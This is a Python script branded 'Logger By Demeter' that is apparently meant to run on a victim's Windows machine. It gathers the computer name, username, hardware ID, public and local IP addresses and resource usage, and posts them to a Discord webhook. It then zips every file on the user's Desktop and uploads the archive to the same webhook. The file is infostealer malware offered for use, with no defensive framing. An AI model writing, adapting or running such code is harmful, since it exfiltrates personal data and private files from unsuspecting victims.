import psutil
import requests
import socket
import requests
import uuid
import getpass
import webbrowser
import os
import zipfile



def send_system_info_to_webhook():
    hw_id = str(uuid.getnode())
    ip_address = socket.gethostbyname(socket.gethostname())
    computer_name = socket.gethostname()
    username = getpass.getuser()
    ownip = requests.get("https://checkip.amazonaws.com/").text.strip()
    url = "your_webhook"
    payload = {}
    payload["content"] = "Openned!"
    payload["embeds"] = []
    embed = {}
    embed["title"] = "PC System info:"
    embed["title"] = "Logger By Demeter"
    embed["thumbnail"] = {"url": "https://cdn.discordapp.com/attachments/1068860613842972712/1072606880993648741/1351845.jpg"}
    embed["fields"] = []
    
    embed["fields"].append({"name": "Computer Name", "value": computer_name})
    embed["fields"].append({"name": "User", "value": username})
    embed["fields"].append({"name": "Hardware ID - - HWID", "value": hw_id})
    embed["fields"].append({"name": "IP ", "value": ownip})
    embed["fields"].append({"name": "Local IP", "value": ip_address})
    
    cpu_percent = psutil.cpu_percent()
    embed["fields"].append({"name": "CPU Usage", "value": str(cpu_percent) + "%"})
    
    memory = psutil.virtual_memory()
    memory_total = memory.total / (1024.0 ** 2)
    memory_available = memory.available / (1024.0 ** 2)
    memory_used = memory.used / (1024.0 ** 2)
    memory_percent = memory.percent
    embed["fields"].append({"name": "RAM Usage", "value": f"{memory_used:.2f} MB / {memory_total:.2f} MB ({memory_percent}%)"})
    
    disk = psutil.disk_usage('/')
    disk_total = disk.total / (1024.0 ** 3)
    disk_used = disk.used / (1024.0 ** 3)
    disk_percent = disk.percent
    embed["fields"].append({"name": "Disk Usage", "value": f"{disk_used:.2f} GB / {disk_total:.2f} GB ({disk_percent}%)"})
    
    
    payload["embeds"].append(embed)
    response = requests.post(url, json=payload)
    print(response.status_code)
    
    
    # Desktop Saver

if __name__ == "__main__":
    send_system_info_to_webhook()
    
DISCORD_WEBHOOK_URL = "your_webhook"

def send_file_to_discord(file_path):
    with open(file_path, "rb") as f:
        files = {"file": (file_path, f)}
        requests.post(DISCORD_WEBHOOK_URL, files=files)

directory = rf"C:\Users\{os.getlogin()}\Desktop"
zip_file_path = r"C:\Users\{os.getlogin()}\Music\Desktop.zip"

with zipfile.ZipFile(zip_file_path, "w") as zip_file:
    for file_name in os.listdir(directory):
        file_path = os.path.join(directory, file_name)
        zip_file.write(file_path)

send_file_to_discord(zip_file_path)

